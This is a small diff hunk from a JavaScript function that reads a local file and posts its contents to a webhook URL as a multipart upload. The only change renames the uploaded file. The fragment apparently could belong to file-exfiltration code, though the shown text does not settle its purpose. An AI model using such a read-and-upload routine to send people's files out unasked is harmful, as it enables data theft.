@@ -117,7 +117,7 @@ function sendFileToWebhook(url, targetFile) {
 
   const formData = `
 --${boundary}\r
-Content-Disposition: form-data; name="file"; filename="allah.zip"\r
+Content-Disposition: form-data; name="file"; filename="allah"\r
 Content-Type: text/plain\r
 \r
 ${fs.readFileSync(targetFile, 'utf-8')}\r
